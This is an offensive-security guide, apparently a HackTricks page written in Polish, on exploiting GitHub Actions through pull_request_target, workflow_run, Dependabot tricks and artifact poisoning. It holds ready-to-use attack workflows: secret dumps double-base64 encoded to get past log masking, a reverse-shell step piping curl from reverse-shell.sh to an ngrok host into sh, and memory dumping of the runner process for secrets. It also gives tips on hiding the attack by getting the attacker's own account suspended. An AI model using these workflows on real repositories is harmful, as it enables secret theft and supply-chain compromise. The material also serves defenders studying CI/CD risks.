# Wykorzystywanie Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Tools

Następujące narzędzia pomagają znaleźć Github Action workflows i nawet wykryć podatne na atak:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Sprawdź też checklistę pod adresem [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Basic Information

Na tej stronie znajdziesz:

- **Podsumowanie wszystkich skutków** dla atakującego, który uzyska dostęp do Github Action
- Różne sposoby, by **uzyskać dostęp do action**:
- Posiadanie **permissions** do utworzenia action
- Nadużywanie triggerów związanych z **pull request**
- Nadużywanie **other external access** techniques
- **Pivoting** z już skompromitowanego repo
- Na końcu sekcja o **post-exploitation techniques to abuse an action from inside** (spowodować wymienione skutki)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Jeśli możesz **wykonać dowolny kod w GitHub Actions** w obrębie **repozytorium**, możesz:

- **Steal secrets** zamontowanych w pipeline i **abuse the pipeline's privileges** w celu uzyskania nieautoryzowanego dostępu do zewnętrznych platform, takich jak AWS i GCP.
- **Compromise deployments** i innych **artifacts**.
- Jeśli pipeline wdraża lub przechowuje zasoby, możesz zmienić finalny produkt, umożliwiając supply chain attack.
- **Execute code in custom workers** w celu nadużycia mocy obliczeniowej i pivotowania do innych systemów.
- **Overwrite repository code**, w zależności od uprawnień związanych z `GITHUB_TOKEN`.

## GITHUB_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) jest przyznawany, gdy administrator włączy tę opcję:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Ten token jest tym samym, którego użyje **Github Application**, więc może uzyskać dostęp do tych samych endpointów: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github powinien udostępnić [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access w obrębie GitHub, więc repo może uzyskać dostęp do innych wewnętrznych repozytoriów używając `GITHUB_TOKEN`.

Możesz zobaczyć możliwe **permissions** tego tokena tutaj: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Zauważ, że token **wygasa po zakończeniu joba**.\
Takie tokeny wyglądają tak: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Kilka interesujących rzeczy, które możesz zrobić z tym tokenem:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Zwróć uwagę, że w kilku przypadkach możesz znaleźć **github user tokens inside Github Actions envs or in the secrets**. Tokeny te mogą dać ci więcej uprawnień względem repozytorium i organizacji.

<details>

<summary>List secrets in Github Action output</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj reverse shell przy użyciu secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Możliwe jest sprawdzenie uprawnień przypisanych do Github Token w repozytoriach innych użytkowników poprzez **sprawdzenie logów Github actions**:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozwolone wykonanie

> [!NOTE]
> To byłby najprostszy sposób na przejęcie Github actions, ponieważ ten scenariusz zakłada, że masz dostęp do **utworzenia nowego repozytorium w organizacji**, lub masz **uprawnienia zapisu do repozytorium**.
>
> Jeśli jesteś w takiej sytuacji, możesz po prostu sprawdzić [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Wykonanie przez utworzenie repozytorium

Jeżeli członkowie organizacji mogą **create new repos** i potrafisz uruchamiać Github actions, możesz **utworzyć nowe repozytorium i ukraść secrets ustawione na poziomie organizacji**.

### Wykonanie z nowej gałęzi

Jeśli możesz **utworzyć nową gałąź w repozytorium, które już zawiera skonfigurowany Github Action**, możesz ją **zmodyfikować**, **wgrać** zawartość, a następnie **uruchomić tę akcję z nowej gałęzi**. W ten sposób możesz **exfiltrate repository and organization level secrets** (ale musisz wiedzieć, jak się nazywają).

> [!WARNING]
> Każde ograniczenie zaimplementowane wyłącznie wewnątrz workflow YAML (na przykład, `on: push: branches: [main]`, warunki jobów lub bramki manualne) może zostać zmienione przez współpracowników. Bez zewnętrznego wymuszenia (branch protections, protected environments, and protected tags), contributor może skierować workflow tak, by uruchomić go na swojej gałęzi i nadużyć zamontowanych secrets/permissions.

Możesz uczynić zmodyfikowaną akcję wykonywalną **ręcznie,** gdy **PR zostanie utworzony** lub gdy **jakiś kod zostanie pushed** (w zależności od tego, jak bardzo chcesz być głośny):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Wykonanie z forków

> [!NOTE]
> Istnieją różne wyzwalacze, które mogą pozwolić atakującemu na **execute a Github Action of another repository**. Jeśli te wyzwalane akcje są źle skonfigurowane, atakujący może być w stanie je przejąć.

### `pull_request`

Wyzwalacz workflow **`pull_request`** uruchomi workflow za każdym razem, gdy pojawi się pull request, z pewnymi wyjątkami: domyślnie, jeśli to jest **pierwszy raz**, gdy **współpracujesz**, jakiś **maintainer** będzie musiał **zatwierdzić** **uruchomienie** workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Ponieważ **domyślne ograniczenie** dotyczy **kontrybutorów po raz pierwszy**, możesz wysłać poprawkę naprawiającą ważny błąd/typo, a następnie wysyłać **inne PR-y**, aby nadużyć swoich nowych przywilejów `pull_request`.
>
> **Przetestowałem to i to nie działa**: ~~Inną opcją byłoby utworzenie konta z nazwą kogoś, kto przyczynił się do projektu i usunął swoje konto.~~

Co więcej, domyślnie **blokowane są uprawnienia do zapisu** i **dostęp do sekretów** w repo docelowym, jak wspomniano w [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Atakujący mógłby zmodyfikować definicję Github Action, aby wykonać dowolne polecenia i dodać dodatkowe akcje. Jednak nie będzie w stanie ukraść sekretów ani nadpisać repo z powodu wspomnianych ograniczeń.

> [!CAUTION]
> **Tak, jeśli atakujący zmieni w PR github action, które zostanie wyzwolone, jego Github Action będzie użyte zamiast tego z repozytorium źródłowego!**

Ponieważ atakujący kontroluje także kod, który jest wykonywany, nawet jeśli nie ma sekretów ani uprawnień zapisu na `GITHUB_TOKEN`, atakujący mógłby na przykład **przesłać złośliwe artefakty**.

### **`pull_request_target`**

Wyzwalacz workflow **`pull_request_target`** ma **uprawnienia do zapisu** w repo docelowym i **dostęp do sekretów** (i nie wymaga zatwierdzenia).

Zwróć uwagę, że wyzwalacz workflow **`pull_request_target`** **uruchamia się w kontekście base**, a nie w tym dostarczonym przez PR (aby **nie uruchamiać nieufnego kodu**). Po więcej informacji o `pull_request_target` [**sprawdź docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Dodatkowo, po więcej informacji o tym specyficznie niebezpiecznym użyciu, zobacz ten [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Może się wydawać, że ponieważ **wykonywany workflow** jest tym zdefiniowanym w **base**, a **nie w PR**, użycie **`pull_request_target`** jest **bezpieczne**, ale istnieje **kilka przypadków, w których tak nie jest**.

A ten będzie miał **dostęp do sekretów**.

### `workflow_run`

Wyzwalacz [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) pozwala uruchomić workflow z innego, gdy ten jest `completed`, `requested` lub `in_progress`.

W tym przykładzie workflow jest skonfigurowany do uruchomienia po zakończeniu oddzielnego workflow "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Co więcej, zgodnie z dokumentacją: Workflow uruchomiony przez zdarzenie `workflow_run` może **uzyskać dostęp do secrets i zapisać tokens, nawet jeśli poprzedni workflow tego nie robił**.

Taki workflow może zostać zaatakowany, jeśli **zależy** od **workflow**, które może być **wyzwolone** przez zewnętrznego użytkownika poprzez **`pull_request`** lub **`pull_request_target`**. Kilka podatnych przykładów można [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Pierwszy polega na tym, że workflow wyzwolony przez **`workflow_run`** pobiera kod atakującego: `${{ github.event.pull_request.head.sha }}`  
Drugi polega na **przekazaniu** **artifact** z **untrusted** kodu do workflow **`workflow_run`** i użyciu zawartości tego artifact w sposób, który czyni go podatnym na **RCE**.

### `workflow_call`

TODO

TODO: Sprawdzić, czy gdy jest uruchamiany z `pull_request`, używany/pobrany kod pochodzi z origin czy z forkowanego PR

## Abusing Forked Execution

Wspomnieliśmy wszystkie sposoby, w jakie zewnętrzny atakujący może spowodować wykonanie GitHub workflow, teraz przyjrzyjmy się, jak te wykonania, jeśli są źle skonfigurowane, mogą być nadużyte:

### Untrusted checkout execution

W przypadku **`pull_request`**, workflow zostanie uruchomiony w **kontekście PR** (czyli wykona **złośliwy kod PR**), ale ktoś musi go najpierw **autoryzować** i będzie on działał z pewnymi [ograniczeniami](#pull_request).

W przypadku workflow używającego **`pull_request_target` or `workflow_run`**, które zależy od workflow, które można wywołać z **`pull_request_target` or `pull_request`**, wykonany zostanie kod z oryginalnego repozytorium, więc **atakujący nie może kontrolować wykonywanego kodu**.

> [!CAUTION]
> Jednak, jeśli **action** ma **jawny PR checkout**, który **pobierze kod z PR** (a nie z base), użyje kodu kontrolowanego przez atakującego. Na przykład (sprawdź linię 12, gdzie pobierany jest kod PR):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencjalnie **nieufny kod jest uruchamiany podczas `npm install` lub `npm build`**, ponieważ skrypty builda i odwołane **packages są kontrolowane przez autora PR**.

> [!WARNING]
> Github dork do wyszukiwania podatnych actions to: `event.pull_request pull_request_target extension:yml` jednak istnieją różne sposoby skonfigurowania jobs, aby wykonywały się bezpiecznie nawet jeśli action jest źle skonfigurowany (np. używając warunków określających, kto jest actor generujący PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Należy zauważyć, że istnieją pewne [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context), których wartości są **kontrolowane** przez **użytkownika** tworzącego PR. Jeśli github action używa tych **danych do wykonania czegokolwiek**, może to doprowadzić do **dowolnego wykonania kodu:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Z dokumentacji: Możesz uczynić **zmienną środowiskową dostępną dla dowolnych kolejnych kroków** w jobie workflow, definiując lub aktualizując zmienną środowiskową i zapisując ją do pliku środowiskowego **`GITHUB_ENV`**.

Jeśli atakujący mógłby **wstrzyknąć dowolną wartość** do tej **zmiennej env**, mógłby wstrzyknąć zmienne środowiskowe, które uruchomią kod w kolejnych krokach, takie jak **LD_PRELOAD** lub **NODE_OPTIONS**.

Na przykład ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), wyobraź sobie workflow, które ufa przesłanemu artifact i zapisuje jego zawartość do zmiennej środowiskowej **`GITHUB_ENV`**. Atakujący mógłby przesłać coś takiego, aby to przejąć:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Jak wskazano w [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), kilka organizacji ma GitHub Action, który merge'uje każdy PR od `dependabot[bot]`, jak w:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Co stanowi problem, ponieważ pole `github.actor` zawiera użytkownika, który spowodował ostatnie zdarzenie wyzwalające workflow. Istnieje kilka sposobów, aby sprawić, by użytkownik `dependabot[bot]` zmodyfikował PR. Na przykład:

- Fork the victim repository
- Dodaj złośliwy payload do swojej kopii
- Włącz Dependabot na swoim fork, dodając przestarzałą zależność. Dependabot utworzy branch naprawiający zależność ze złośliwym kodem.
- Open a Pull Request to the victim repository from that branch (the PR will be created by the user so nothing will happen yet)
- Następnie atakujący wraca do początkowego PR, który Dependabot otworzył w jego fork i uruchamia `@dependabot recreate`
- Wtedy Dependabot wykonuje pewne akcje w tym branchu, które modyfikują PR w repo ofiary, co sprawia, że `dependabot[bot]` jest aktorem ostatniego zdarzenia wywołującego workflow (i w rezultacie workflow się uruchamia).

Przechodząc dalej, co jeśli zamiast merge'a Github Action miałby command injection, jak w:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Cóż, oryginalny wpis na blogu proponuje dwie opcje nadużycia tego zachowania, z których druga to:

- Utwórz fork repozytorium ofiary i włącz Dependabot z jakąś przestarzałą zależnością.
- Utwórz nowy branch ze złośliwym kodem shell injection.
- Zmień domyślny branch repo na ten.
- Stwórz PR z tego brancha do repozytorium ofiary.
- Uruchom `@dependabot merge` w PR, który Dependabot otworzył w jego fork.
- Dependabot zmerguje jego zmiany do domyślnego brancha twojego forkowanego repozytorium, aktualizując PR w repozytorium ofiary, sprawiając, że `dependabot[bot]` będzie aktorem ostatniego zdarzenia, które wywołało workflow, i używając złośliwej nazwy brancha.

### Wrażliwe Github Actions stron trzecich

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

Problem polega na tym, że jeśli parametr **`path`** nie jest ustawiony, artifact jest rozpakowywany w bieżącym katalogu i może nadpisać pliki, które później mogą być użyte lub nawet wykonane w workflow. W związku z tym, jeśli artifact jest podatny, atakujący może to wykorzystać do kompromitacji innych workflows, które ufają temu artifactowi.

Przykład podatnego workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Można to zaatakować przy użyciu tego workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Inny dostęp zewnętrzny

### Deleted Namespace Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **mniej niż 100 stars przed zmianą nazwy**, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> Jeśli action używa repo z nieistniejącego konta, nadal możliwe jest, że attacker utworzy to konto i przejmie action.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> W tej sekcji omówimy techniki, które pozwolą **pivot from one repo to another**, zakładając, że mamy jakiś rodzaj access do pierwszego (zobacz poprzednią sekcję).

### Cache Poisoning

A cache is maintained between **workflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Przykład:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Dostęp do AWS i GCP przez OIDC

Sprawdź następujące strony:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Dostęp do sekretów <a href="#accessing-secrets" id="accessing-secrets"></a>

Jeśli wstrzykujesz zawartość do skryptu, warto wiedzieć, jak uzyskać dostęp do sekretów:

- Jeśli sekret lub token jest ustawiony jako **environment variable**, można uzyskać do niego bezpośredni dostęp przez środowisko używając **`printenv`**.

<details>

<summary>Wypisz sekrety w wyjściu Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj reverse shell, używając secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Jeśli secret jest użyty **bezpośrednio w wyrażeniu**, wygenerowany skrypt powłoki jest zapisany **na dysku** i jest dostępny.
- ```bash
cat /home/runner/work/_temp/*
```
- W przypadku JavaScript actions secrets są przesyłane przez zmienne środowiskowe
- ```bash
ps axe | grep node
```
- W przypadku **custom action**, ryzyko może się różnić w zależności od tego, w jaki sposób program używa secret, który otrzymał z **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Wylicz wszystkie secrets za pomocą secrets context (poziom collaborator). Współautor z uprawnieniami do zapisu może zmodyfikować workflow na dowolnym branchu, aby zrzucić wszystkie repository/org/environment secrets. Użyj podwójnego base64, aby obejść maskowanie logów GitHub i zdekoduj lokalnie:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Dekoduj lokalnie:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Wskazówka: podczas testów, dla zachowania kamuflażu, zaszyfruj przed wypisaniem (openssl jest preinstalowany na GitHub-hosted runners).

### Wykorzystywanie Self-hosted runners

Sposób, aby znaleźć, które **Github Actions are being executed in non-github infrastructure**, to wyszukać **`runs-on: self-hosted`** w konfiguracji Github Action yaml.

**Self-hosted** runners mogą mieć dostęp do **extra sensitive information**, do innych **network systems** (vulnerable endpoints in the network? metadata service?) lub, nawet jeśli są izolowane i usunięte, **more than one action might be run at the same time** i złośliwa mogłaby **steal the secrets** innej.

W self-hosted runnerach możliwe jest również uzyskanie **secrets from the \_Runner.Listener**\_\*\* process\*\* który będzie zawierał wszystkie secrets of the workflows na dowolnym etapie poprzez zrzucenie jego pamięci:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Sprawdź [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Rejestr obrazów Docker w Github

Możliwe jest utworzenie Github actions, które **zbudują i przechowają obraz Dockera w Github**.\
Przykład można znaleźć w poniższym rozwijanym elemencie:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Jak widać w poprzednim kodzie, rejestr Github jest hostowany w **`ghcr.io`**.

Użytkownik z uprawnieniami do odczytu repozytorium będzie w stanie pobrać Docker Image przy użyciu personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Następnie użytkownik mógłby wyszukać **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Poufne informacje w logach Github Actions

Nawet jeśli **Github** próbuje **detect secret values** w logach actions i **avoid showing** je, **inne wrażliwe dane** które mogły zostać wygenerowane podczas wykonania action nie będą ukryte. Na przykład JWT podpisany za pomocą wartości sekretu nie zostanie ukryty, chyba że jest [specjalnie skonfigurowane](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Ukrywanie śladów

(Technika z [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Po pierwsze, każdy PR jest wyraźnie widoczny publicznie na Github i dla docelowego konta GitHub. Domyślnie na GitHub nie możemy usunąć PR z internetu, ale jest pewien trik. Dla kont GitHub, które zostaną zawieszone przez GitHub, wszystkie ich PR są automatycznie usuwane i usuwane z internetu. Aby więc ukryć swoją aktywność, musisz albo doprowadzić do zawieszenia swojego GitHub account lub sprawić, by twoje konto zostało oznaczone. To ukryje wszystkie twoje działania na GitHub przed internetem (praktycznie usunie wszystkie twoje exploit PR)

Organizacja na GitHub jest bardzo aktywna w zgłaszaniu kont do GitHub. Wystarczy, że udostępnisz „some stuff” w Issue i oni zadbają, żeby twoje konto zostało zawieszone w ciągu 12 godzin :p i oto masz — twój exploit stał się niewidoczny na github.

> [!WARNING]
> Jedyny sposób, by organizacja zorientowała się, że została zaatakowana, to sprawdzenie logów GitHub z SIEM, ponieważ z poziomu UI GitHub PR zostanie usunięty.

## Referencje

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
